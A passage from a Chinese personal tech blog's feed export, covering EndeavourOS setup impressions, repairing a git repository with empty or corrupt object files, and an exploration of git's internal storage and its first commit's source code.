<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S autorandr</span><br><span class="line">autorandr horizontal &amp;&amp; autorandr vertical <span class="comment"># 这里我直接把显示长宽分辨率都直接拉满了</span></span><br><span class="line">autorandr --save test1</span><br></pre></td></tr></table></figure>

<p>或者你可以手动编辑<code>/etc/X11/xorg.conf.d</code>下的配置</p>
<p>见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1hyYW5kcg==">Arch Wiki xrandr<i class="fa fa-external-link-alt"></i></span></p>
<p>其实每次开机运行一下xrandr可能更好一点（如果你不是wayland的话），不少人都是这么搞得（顺便刷新调整一下字体啥的</p>
<p><img src="/why-not-try-endeavouros/image-20200923222725926.png" alt="xrandr"></p>
<h2 id="Mac-win10上的一些软件"><a href="#Mac-win10上的一些软件" class="headerlink" title="Mac&#x2F;win10上的一些软件"></a>Mac&#x2F;win10上的一些软件</h2><p><del>请阅读王垠经典博文完全用linux工作</del><br>不少时候用wine还是能搞定的（如果你不在乎wine的稳定性的话），包括一些大型软件，比如PS<br>当然有的东西用wine体验远没有虚拟机好，拿Virtualbox或者KVM开个虚拟机是个不错的选择。或者身边有闲置安卓机用scrcpy投屏，或者KDE Connect传文件。</p>
<p>部分国产软件开个黑果虚拟机感觉体验比windows虚拟机略好一点<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZveGxldC9tYWNPUy1TaW1wbGUtS1ZN">https://github.com/foxlet/macOS-Simple-KVM<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一点闲话"><a href="#一点闲话" class="headerlink" title="一点闲话"></a>一点闲话</h2><p>其实我一直很期待Arch系诞生一批用户友好的桌面发行版，就像Debian那样衍生出Ubuntu、Linux Mint那样。（虽然这很不Arch）</p>
<ol>
<li>之前被apt的地狱依赖搞得心态崩了，想用pacman系的（反正打包粒度粗一点好，硬盘现在这么便宜又不在乎占多大地方）</li>
<li>喜欢KDE</li>
<li>想要稳定一点的系统做日常主力搬砖用</li>
<li>安装方便一点。这个倒是无所谓，不过出了事LiveCD抢救也想有个图形界面方便抢修</li>
</ol>
<p>Arch把wifi-menu去掉之后就不太想用原味Arch了，我这笔记本没网口高通网卡Nividia独显实在八字不合，只想佛系地找个好装的iso</p>
<p>KaOS基本符合，然而包太少（加上KCP社区包也还是很少），可惜….<br>另一个<span class="exturl" data-url="aHR0cHM6Ly93d3cuY2hha3JhbGludXgub3JnLw==">chakra<i class="fa fa-external-link-alt"></i></span>也是包太少（这个有自己的CCR社区包，包也不多），KDE和Qt骨灰爱好者的宝藏，软件基本全套KDE和Qt（不过据说他们人手不够维护不过来了打算换到）</p>
<p>此外还有各种层出不穷的真*Arch安装器<br><span class="exturl" data-url="aHR0cHM6Ly9maXJlcmFpbi5tZS8=">https://firerain.me/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9nYXJ1ZGFsaW51eC5vcmcvaW5kZXguaHRtbA==">https://garudalinux.org/index.html<i class="fa fa-external-link-alt"></i></span></p>
<p>Antergos的继承者，EndeavourOS满足了前两点，貌似xfce主题魔改了点主题，KDE基本原封不动。当时Manjaro闹分裂，jonathon出走了，我也跟着跑路到了这个发行版;用了一段时间感觉还不错，接近原味Arch, 不像Manjaro一样整了很多超出自己驾驭能力的魔改。推荐各位Manjaro用户和想用pacman又嫌麻烦的用户尝试一下。<br>现在看win10反而不习惯，索性把教研室搬砖那台win10全格了只装这个（要用到windows的时候上win7虚拟机 ps. win7 和KDE好像啊）</p>
<p>那天还看到肥猫跑到Manjaro群里推这个</p>
<p><img src="/why-not-try-endeavouros/miao.png"></p>
<p>第二天welcome就有了中文，感动</p>
<p><img src="/why-not-try-endeavouros/miaomiao.png"></p>
<p>能制止Manjaro的不是Arch佬的疯狂洗手，是另一个比Manjaro更好的Arch简易安装器，EndeavourOS合格了。</p>
<p>最后，不要对EndeavourOS抱有过高的期待，感觉他们人手还是不太足。</p>
<p>不过大方向是走对了，基本上就做做开箱即用和一些代替命令操作的图形界面，没有像Manjaro那样各种魔改搞出很多Arch上反而没有的问题。就比如linux内核切换的图形界面akm，基本上就是代替了archwiki上的手动操作，选项也只有linux,linux-lts,linux-zen几个。不像Manjaro那个内核切换，从linux 5.3 到linux 5.8最新版全都有，非常奔放，你要是真随便选一个linux和linux-lts之外的，哪天滚着滚着就出问题了。</p>
<p><img src="/why-not-try-endeavouros/akm.png"></p>
<p>Arch的安装脚本和只是换了个皮的安装器层出不穷，目前看来EndeavourOS是最令人满意的一个（好吧，默认是xfce，这个离线装了然后改DE就好了）</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>AUR包数量很庞大，但也有一些包目前还没有，有精力和意愿打包的可以去给AUR提交打包<br>可以参看</p>
<ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy8=">Archlinux User Repository<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0NyZWF0aW5nX3BhY2thZ2Vz">Creating packages<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfVXNlcl9SZXBvc2l0b3J5XyglRTclQUUlODAlRTQlQkQlOTMlRTQlQjglQUQlRTYlOTYlODcp">Arch用户仓库<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfcGFja2FnaW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(2)-创建一个软件包<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfc3VtYml0aW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(3)-提交软件包到AUR<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>KDE的中文翻译也缺人，有精力的玩家可以去当翻译，中文翻译组在<span class="exturl" data-url="aHR0cHM6Ly9jcm93ZGluLmNvbS9wcm9qZWN0L2tkZW9yZw==">这里<i class="fa fa-external-link-alt"></i></span><br>KDE那边貌似挺缺打杂苦力的，熟悉Qt的同学可以去给社区做点贡献.</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>KDE</tag>
        <tag>EndeavourOS</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次git错误：“error object file .git/objects/.... is empty”</title>
    <url>/git-error-object-file-is-empty/</url>
    <content><![CDATA[<p>git又坏了。系统又卡死了，tty都调不出来，强按关机键重启后出现的。应该是git操作中途强退导致的数据损毁。见<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMTE3MDYyMTUvaG93LWNhbi1pLWZpeC10aGUtZ2l0LWVycm9yLW9iamVjdC1maWxlLWlzLWVtcHR5">How can I fix the Git error “object file … is empty”?<i class="fa fa-external-link-alt"></i></span> </p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$git</span> status</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">fatal: bad object HEAD</span><br></pre></td></tr></table></figure>

<p>修复倒也简单，之前传了一份到github上了。把本地的repo删了重新clone一遍就好了。</p>
<p>但是这些断点损毁的问题还挺好玩的，尝试一下能不能手动修复。先执行fsck检查一下，出现了一堆error。错误主要有</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/cg/ray_tracing ❯ git fsck --full                                 ✘ INT</span><br><span class="line">error: inflate: data stream error (unknown compression method)</span><br><span class="line">error: unable to unpack header of .git/objects/30/c28c65105992b8bf597f0388378c4724e163a5</span><br><span class="line">error: 30c28c65105992b8bf597f0388378c4724e163a5: object corrupt or missing: .git/objects/30/c28c65105992b8bf597f0388378c4724e163a5</span><br><span class="line">error: object file .git/objects/35/bfb29f7bf7d9940faa7b6859a1c3df91cca116 is empty</span><br><span class="line">error: unable to mmap .git/objects/35/bfb29f7bf7d9940faa7b6859a1c3df91cca116: No such file or directory</span><br><span class="line">error: 35bfb29f7bf7d9940faa7b6859a1c3df91cca116: object corrupt or missing: .git/objects/35/bfb29f7bf7d9940faa7b6859a1c3df91cca116</span><br><span class="line">error: object file .git/objects/36/c81d09506146f59c67b572ad816bbecb60db1c is empty</span><br><span class="line">error: unable to mmap .git/objects/36/c81d09506146f59c67b572ad816bbecb60db1c: No such file or directory</span><br><span class="line">error: 36c81d09506146f59c67b572ad816bbecb60db1c: object corrupt or missing: .git/objects/36/c81d09506146f59c67b572ad816bbecb60db1c</span><br><span class="line">error: object file .git/objects/56/1f5c8ca81e1ecb6f98c614b3d5f31309c1b037 is empty</span><br><span class="line">error: unable to mmap .git/objects/56/1f5c8ca81e1ecb6f98c614b3d5f31309c1b037: No such file or directory</span><br><span class="line">error: 561f5c8ca81e1ecb6f98c614b3d5f31309c1b037: object corrupt or missing: .git/objects/56/1f5c8ca81e1ecb6f98c614b3d5f31309c1b037</span><br><span class="line">error: object file .git/objects/86/74f05d2355cb5ca9b32cdc2c2939f2fcc921d4 is empty</span><br><span class="line">error: unable to mmap .git/objects/86/74f05d2355cb5ca9b32cdc2c2939f2fcc921d4: No such file or directory</span><br><span class="line">error: 8674f05d2355cb5ca9b32cdc2c2939f2fcc921d4: object corrupt or missing: .git/objects/86/74f05d2355cb5ca9b32cdc2c2939f2fcc921d4</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: unable to mmap .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0: No such file or directory</span><br><span class="line">error: 9045d3aeb3539443f6b0a904935e9eb559fa5ef0: object corrupt or missing: .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0</span><br><span class="line">error: inflate: data stream error (unknown compression method)</span><br><span class="line">error: unable to unpack header of .git/objects/c1/d4bc9d219d8b729d9b7e8a865f8972beac3014</span><br><span class="line">error: c1d4bc9d219d8b729d9b7e8a865f8972beac3014: object corrupt or missing: .git/objects/c1/d4bc9d219d8b729d9b7e8a865f8972beac3014</span><br><span class="line">error: object file .git/objects/cb/4fbbc9dcff805f550461cf27a860c1f884b77c is empty</span><br><span class="line">error: unable to mmap .git/objects/cb/4fbbc9dcff805f550461cf27a860c1f884b77c: No such file or directory</span><br><span class="line">error: cb4fbbc9dcff805f550461cf27a860c1f884b77c: object corrupt or missing: .git/objects/cb/4fbbc9dcff805f550461cf27a860c1f884b77c</span><br><span class="line">error: object file .git/objects/d2/f1a78796402cb9858f66c7fe0d3dd90855fac1 is empty</span><br><span class="line">error: unable to mmap .git/objects/d2/f1a78796402cb9858f66c7fe0d3dd90855fac1: No such file or directory</span><br><span class="line">error: d2f1a78796402cb9858f66c7fe0d3dd90855fac1: object corrupt or missing: .git/objects/d2/f1a78796402cb9858f66c7fe0d3dd90855fac1</span><br><span class="line">error: object file .git/objects/da/3cd6e317e0deb80fd7beda238d7baae23d2e60 is empty</span><br><span class="line">error: unable to mmap .git/objects/da/3cd6e317e0deb80fd7beda238d7baae23d2e60: No such file or directory</span><br><span class="line">error: da3cd6e317e0deb80fd7beda238d7baae23d2e60: object corrupt or missing: .git/objects/da/3cd6e317e0deb80fd7beda238d7baae23d2e60</span><br><span class="line">error: object file .git/objects/e3/d3c4a99ac521fd488886206c5677f1b7f526b7 is empty</span><br><span class="line">error: unable to mmap .git/objects/e3/d3c4a99ac521fd488886206c5677f1b7f526b7: No such file or directory</span><br><span class="line">error: e3d3c4a99ac521fd488886206c5677f1b7f526b7: object corrupt or missing: .git/objects/e3/d3c4a99ac521fd488886206c5677f1b7f526b7</span><br><span class="line">error: object file .git/objects/f3/af97d3545900a65d722ee8ba661bad4e632884 is empty</span><br><span class="line">error: unable to mmap .git/objects/f3/af97d3545900a65d722ee8ba661bad4e632884: No such file or directory</span><br><span class="line">error: f3af97d3545900a65d722ee8ba661bad4e632884: object corrupt or missing: .git/objects/f3/af97d3545900a65d722ee8ba661bad4e632884</span><br><span class="line">error: object file .git/objects/fb/2dc1179dc5274f930b0c0a030c38cbb1c014fd is empty</span><br><span class="line">error: unable to mmap .git/objects/fb/2dc1179dc5274f930b0c0a030c38cbb1c014fd: No such file or directory</span><br><span class="line">error: fb2dc1179dc5274f930b0c0a030c38cbb1c014fd: object corrupt or missing: .git/objects/fb/2dc1179dc5274f930b0c0a030c38cbb1c014fd</span><br><span class="line">Checking object directories: 100% (256/256), <span class="keyword">done</span>.</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: refs/heads/master: invalid sha1 pointer 9045d3aeb3539443f6b0a904935e9eb559fa5ef0</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: refs/remotes/origin/master: invalid sha1 pointer 9045d3aeb3539443f6b0a904935e9eb559fa5ef0</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: object file .git/objects/90/45d3aeb3539443f6b0a904935e9eb559fa5ef0 is empty</span><br><span class="line">error: HEAD: invalid sha1 pointer 9045d3aeb3539443f6b0a904935e9eb559fa5ef0</span><br><span class="line">error: refs/heads/master: invalid reflog entry 9045d3aeb3539443f6b0a904935e9eb559fa5ef0</span><br><span class="line">error: HEAD: invalid reflog entry 9045d3aeb3539443f6b0a904935e9eb559fa5ef0</span><br><span class="line">error: object file .git/objects/36/c81d09506146f59c67b572ad816bbecb60db1c is empty</span><br><span class="line">error: object file .git/objects/36/c81d09506146f59c67b572ad816bbecb60db1c is empty</span><br><span class="line">error: 36c81d09506146f59c67b572ad816bbecb60db1c: invalid sha1 pointer <span class="keyword">in</span> cache-tree of .git/index</span><br><span class="line">missing blob 30c28c65105992b8bf597f0388378c4724e163a5</span><br><span class="line">missing blob 35bfb29f7bf7d9940faa7b6859a1c3df91cca116</span><br><span class="line">dangling tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904</span><br><span class="line">missing blob 561f5c8ca81e1ecb6f98c614b3d5f31309c1b037</span><br><span class="line">missing blob 8674f05d2355cb5ca9b32cdc2c2939f2fcc921d4</span><br><span class="line">missing blob c1d4bc9d219d8b729d9b7e8a865f8972beac3014</span><br><span class="line">missing blob cb4fbbc9dcff805f550461cf27a860c1f884b77c</span><br><span class="line">missing blob d2f1a78796402cb9858f66c7fe0d3dd90855fac1</span><br><span class="line">missing blob da3cd6e317e0deb80fd7beda238d7baae23d2e60</span><br><span class="line">missing blob e3d3c4a99ac521fd488886206c5677f1b7f526b7</span><br><span class="line">missing blob fb2dc1179dc5274f930b0c0a030c38cbb1c014fd</span><br></pre></td></tr></table></figure>

<p>object corrupt or missing 和 empty object的问题可以直接删除损坏的object，然后接着修下面的报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/cg master ✚ ? ❯ git fsck --full                                          </span><br><span class="line">Checking object directories: 100% (256/256), <span class="keyword">done</span>.</span><br><span class="line">broken <span class="built_in">link</span> from    tree f3af97d3545900a65d722ee8ba661bad4e632884</span><br><span class="line">              to    blob c1d4bc9d219d8b729d9b7e8a865f8972beac3014</span><br><span class="line">dangling tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904</span><br><span class="line">missing blob c1d4bc9d219d8b729d9b7e8a865f8972beac3014</span><br></pre></td></tr></table></figure>

<p>broken link的问题可以通过删除git的index后重新生成解决。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> .git/index</span><br><span class="line">git reset</span><br></pre></td></tr></table></figure>

<p>此时git能正常使用了，但还是存在dangling tree 和 missing blob，dangling tree不是错误，见<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvOTk1NTcxMy9naXQtZGFuZ2xpbmctYmxvYnM=">git: dangling blobs<i class="fa fa-external-link-alt"></i></span>  </p>
<p>missing blob 的问题可以找到有问题的blob对应的文件，然后重新生成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/cg master ● ⍟1 ❯ git ls-tree -r HEAD | grep c1d4bc9d219d8b729d9b7e8a865f8972beac3014</span><br><span class="line">100644 blob c1d4bc9d219d8b729d9b7e8a865f8972beac3014    ray_tracing/CMakeLists.txt</span><br><span class="line">git hash-object -w ray_tracing/CMakeLists.txt</span><br></pre></td></tr></table></figure>

<p>或者用<code>git reflog</code>直接删了也可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reflog expire --expire=now --all</span><br></pre></td></tr></table></figure>

<p>修复完成，收工。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/cg master ❯ git fsck --full                              </span><br><span class="line">Checking object directories: 100% (256/256), <span class="keyword">done</span>.</span><br><span class="line">Checking objects: 100% (128/128), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git存储结构与实现</title>
    <url>/git-structure/</url>
    <content><![CDATA[<p>突然发现git还挺有意思的，实现很像kv存储文件系统。</p>
<span id="more"></span>

<p>有一天博客的repo在vscode侧栏source control显示不出更改文件和详情了，只有一个几个更改的文件个数，但是其他的repo又是好的。用sublime merge和<code>git diff</code>,<code>git status</code>等其他工具和命令也都是好的。（别问我为什么不用sublime merge，我现在被迫）于是研究了半天<code>.git</code>文件夹和git原理试图搞清哪出问题了。（最后发现是submodule的问题）之前在hackergame2023游玩的时候有道题是从 git repo 里找flag，然后又去拆<code>.git</code>文件夹。看着看着发现git有点意思。</p>
<p>先来看一下git的目录结构，<code>.git</code>目录下面文件大概长这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">cd</span> .git</span><br><span class="line">&gt;tree -L 1</span><br><span class="line">.</span><br><span class="line">├── branches</span><br><span class="line">├── COMMIT_EDITMSG</span><br><span class="line">├── config</span><br><span class="line">├── description</span><br><span class="line">├── FETCH_HEAD</span><br><span class="line">├── HEAD</span><br><span class="line">├── hooks</span><br><span class="line">├── index</span><br><span class="line">├── info</span><br><span class="line">├── logs</span><br><span class="line">├── objects</span><br><span class="line">├── ORIG_HEAD</span><br><span class="line">├── packed-refs</span><br><span class="line">└── refs</span><br></pre></td></tr></table></figure>

<p>用<code>ncdu</code>看一下文件的大小，发现Objects是很大的</p>
<p><code>objects</code>下面有info和pack，以及存放的所有对象</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">cd</span> objects &amp;&amp; <span class="built_in">ls</span></span><br><span class="line">03  15  27  35  49  5e  64  6c  7b  84  99  ac  bf  c6  d3  e0  ee  fd</span><br><span class="line">0b  17  2a  37  4e  60  65  6e  7c  85  9c  ba  c0  c7  d4  e4  f0  fe</span><br><span class="line">0d  20  2d  40  53  62  69  72  7f  87  a4  bc  c1  c9  <span class="built_in">dd</span>  ea  f5  info</span><br><span class="line">0f  21  34  43  55  63  6b  74  81  92  a9  bd  c2  d2  <span class="built_in">df</span>  ed  f6  pack</span><br></pre></td></tr></table></figure>

<p>git用sha1值存储，其他的两个数字或字母开头的文件名是sha1前两位，目录中文件名是sha1值，文件采用zlib压缩格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/blog/.g/objects master ?1 ❯ tree                               7s</span><br><span class="line">.</span><br><span class="line">├── 03</span><br><span class="line">│   └── 4c85b33ffa84adfb9f44d3c38fe13915e18a7c</span><br><span class="line">├── 0b</span><br><span class="line">│   └── 54054172c2050751407e0e9ae9a6c67436822c</span><br><span class="line">├── 0d</span><br><span class="line">│   ├── 0bc9b8cf7b882a3e5dfcd0790f09bc3482e8fe</span><br><span class="line">│   ├── 48c09ea03af3c3f6667be46ed57514e257acfc</span><br><span class="line">│   └── a1ba91c7ead0c0bb4e020a89b8a81ccaec137d</span><br></pre></td></tr></table></figure>

<p>今年的hackergame的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1VTVEMtSGFja2VyZ2FtZS9oYWNrZXJnYW1lMjAyMy13cml0ZXVwcy9ibG9iL21hc3Rlci9vZmZpY2lhbC9HaXQlMjBHaXQhL1JFQURNRS5tZA==">git题目<i class="fa fa-external-link-alt"></i></span>就是从这里面找flag，撤销commit后在objects下面还有残留数据，于是从objects下的zlib文件后解压后查找flag即可。（文件名的hash可以从git reflog中获取）</p>
<p>解压可以用gzip或者openssl</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zlibd() (<span class="built_in">printf</span> <span class="string">&quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot;</span> | <span class="built_in">cat</span> - <span class="string">&quot;<span class="variable">$@</span>&quot;</span> | gzip -dc)</span><br><span class="line">zlibd 97126e45aebd4c938edc8e11c28cef347cd317 | hexdump -C</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者用pigz</span></span><br><span class="line">unpigz &lt; 97126e45aebd4c938edc8e11c28cef347cd317 | hexdump -C</span><br></pre></td></tr></table></figure>

<p>或者蟒蛇</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">s = <span class="string">&#x27;...&#x27;</span></span><br><span class="line">z = zlib.uncompress(s)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;yourfile&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(z)</span><br></pre></td></tr></table></figure>

<p>refs目录比较简单，是对obejects的reference，其中origin的HEAD为远程分支。packed-refs文件和refs作用一样。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/blog/.git master ?1 ❯ tree refs        </span><br><span class="line">refs</span><br><span class="line">├── heads</span><br><span class="line">│   └── master</span><br><span class="line">├── remotes</span><br><span class="line">│   └── origin</span><br><span class="line">│       ├── HEAD</span><br><span class="line">│       └── master</span><br><span class="line">└── tags</span><br></pre></td></tr></table></figure>

<p>config文件为git的配置，index是索引, logs是提交日志，hooks下面是一堆bash脚本</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>git的对象包括blob，tree，commit，tag，blob是文件，tree是目录，在上面的目录结构中都已经看过了。还有一些二进制文件，推荐使用<code>git-lfs</code></p>
<p>git的存储方式是通过类似inode的指针，一般是一个树状，但是commit和branch会变成一个比较复杂的图。</p>
<p><img src="/git-structure/image.png" alt="pointer">  </p>
<p><img src="/git-structure/image-1.png" alt="git">  </p>
<ul>
<li>add操作</li>
</ul>
<p><code>git add</code>会把文件添加到缓冲区（staged）</p>
<ul>
<li>commit操作</li>
</ul>
<p><code>git commit</code>会添加缓冲区的版本<br>如果<code>git commit -a</code>会直接跳过缓冲区（跳过git add），直接添加untracked的版本</p>
<ul>
<li>rm操作</li>
</ul>
<p>rm操作把文件从tracked file list中移除（但是Object中还有历史版本，可以找到）。还没有staged的文件可以直接<code>git rm</code>，但是如果已经staged或者已经commit添加到snapshot中，就需要<code>git rm -f</code>。</p>
<p>如果直接rm，会把文件也删除，大多数情况下是不小心把一堆编译产物或者二进制文件加到缓冲区去了，这时候要用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">rm</span> --cached yourfile</span><br></pre></td></tr></table></figure>

<ul>
<li>mv操作</li>
</ul>
<p>git中没有类似文件系统的重命名，mv操作相当于删除后再次添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">mv</span> oldname newname</span><br><span class="line"><span class="comment"># 相当于</span></span><br><span class="line"><span class="built_in">mv</span> oldname newname</span><br><span class="line">git <span class="built_in">rm</span> oldname</span><br><span class="line">git add newname</span><br></pre></td></tr></table></figure>

<h3 id="git是增量存储吗"><a href="#git是增量存储吗" class="headerlink" title="git是增量存储吗"></a>git是增量存储吗</h3><p>中文网上大多数资料（比如不靠谱的某乎某SDN某思否）想当然的说git是增量存储的。但是，Pro Git和 Github Blog上说了，<strong>Commits are snapshots, not diffs</strong>。当然是选择相信Github Blog啦，如果不信自己建一个repo commit一下试试看看上一节的<code>.git</code>目录里的Object有什么变化就知道了。上一接我们已经看过Objects下面的blob了，并不是增量的。</p>
<p>git采用的保存方式是快照（snapshot），比较像zfs和btrfs的快照（当然那个是块级别的，这个只是对每个文件做快照），tree和blob内容都是zlib压缩后</p>
<blockquote>
<p>Commits, trees, and blobs are immutable</p>
</blockquote>
<p>git的增量，是当每次更改的时候</p>
<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><ul>
<li>push, pull, clone</li>
</ul>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="初版"><a href="#初版" class="headerlink" title="初版"></a>初版</h3><p>初版git的实现比较精简，代码量也比较少，可以观摩一下。先看一下第一次提交的版本。”initial revision of “git”, the information manager from hell”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/git/git.git</span><br><span class="line">git checkout e83c5163316f89bfbde7d9ab23ca2e25604af290</span><br></pre></td></tr></table></figure>

<p>README依然狂野<code>GIT - the stupid content tracker</code></p>
<p>初版代码量很少，没有今天常用的<code>git add</code>和<code>git commit</code>等功能，实现很精简，完成了自举。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/codes/git @e83c5163 +11 !4 ?3 ❯ cloc ./</span><br><span class="line">      12 text files.</span><br><span class="line">      11 unique files.                              </span><br><span class="line">       4 files ignored.</span><br><span class="line"></span><br><span class="line">github.com/AlDanial/cloc v 1.98  T=0.01 s (789.0 files/s, 78109.3 lines/s)</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Language                     files          blank        comment           code</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">C                                8            115             59            775</span><br><span class="line">C/C++ Header                     1             17             23             57</span><br><span class="line">make                             1             15              0             27</span><br><span class="line">JSON                             1              0              0              1</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">SUM:                            11            147             82            860</span><br><span class="line">-------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<blockquote>
<p>This is a stupid (but extremely fast) directory content manager.  It<br>doesn’t do a whole lot, but what it <em>does</em> do is track directory<br>contents efficiently. </p>
</blockquote>
<p>直接<code>make</code>会报错，需要修改makefile，LIBS改为<code>LIBS= -lcrypto -lz</code>，然后在<code>cache.h</code>中<code>#include &lt;string.h&gt;</code></p>
<p>或者用别人改好的能编译的babygit：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://bitbucket.org/jacobstopak/baby-git.git</span><br></pre></td></tr></table></figure>

<p>先看一下README的介绍：There are two object abstractions: the “object database”, and the “current directory cache”.</p>
<p>初版的BLOB和TREE Object和现在的差不多，以及一个CHANGESET。</p>
<blockquote>
<p>CHANGESET: The “changeset” object is an object that introduces the notion of history into the picture.  In contrast to the other objects, it doesn’t just describe the physical state of a tree, it describes how we got there, and why. </p>
</blockquote>
<p>changeset用来记录提交信息</p>
<blockquote>
<p>Note on changesets: unlike real SCM’s, changesets do not contain rename<br>information or file mode chane information.  All of that is implicit in<br>the trees involved (the result tree, and the result trees of the<br>parents), and describing that makes no sense in this idiotic file<br>manager.</p>
</blockquote>
<p>可以看到，git一开始最早设计的时候就没有其他源码管理系统的重命名功能，这些操作被视为tree的删除和添加替代了。</p>
<p>init-db.c比较简单，用来初始化，类似现在的<code>git init</code>，创建repo并初始化，会在当前目录创建一个<code>.dircache</code>目录，类似<code>.git</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The default case is to have a DB per managed directory. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">sha1_dir = DEFAULT_DB_ENVIRONMENT;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;defaulting to private storage area\n&quot;</span>);</span><br><span class="line">len = <span class="built_in">strlen</span>(sha1_dir);</span><br><span class="line"><span class="keyword">if</span> (mkdir(sha1_dir, <span class="number">0700</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (errno != EEXIST) &#123;</span><br><span class="line">    perror(sha1_dir);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">path = <span class="built_in">malloc</span>(len + <span class="number">40</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(path, sha1_dir, len);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">sprintf</span>(path+len, <span class="string">&quot;/%02x&quot;</span>, i);</span><br><span class="line">  <span class="keyword">if</span> (mkdir(path, <span class="number">0700</span>) &lt; <span class="number">0</span>) 